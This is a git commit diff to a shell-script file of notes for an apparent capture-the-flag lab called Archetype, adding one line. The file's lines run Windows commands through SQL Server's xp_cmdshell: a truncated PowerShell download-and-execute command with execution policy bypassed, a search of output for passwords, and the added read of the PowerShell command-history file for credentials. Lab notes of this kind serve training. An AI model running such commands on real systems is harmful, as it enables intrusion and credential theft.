7bf8d3db9545dd7ec24f60c5f51819a4c3b597b7
adita0898@gmail.com <adita0898@gmail.com>
2026-09-24 18:32:48 -0700

    Check the history

--- Labs/Very-Easy/Archetype.sh
+++ Labs/Very-Easy/Archetype.sh
@@ -42,6 +42,8 @@ EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -Command "IEX (New-Object N
 
 EXEC xp_cmdshell 'findstr /i "password admin administrator credentials" C:\Users\[user]\Desktop\output.txt';
 
+EXEC xp_cmdshell 'type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\[Task 7].txt';
+
 # Task 7 solved.
 
 # Flag 1 solved.
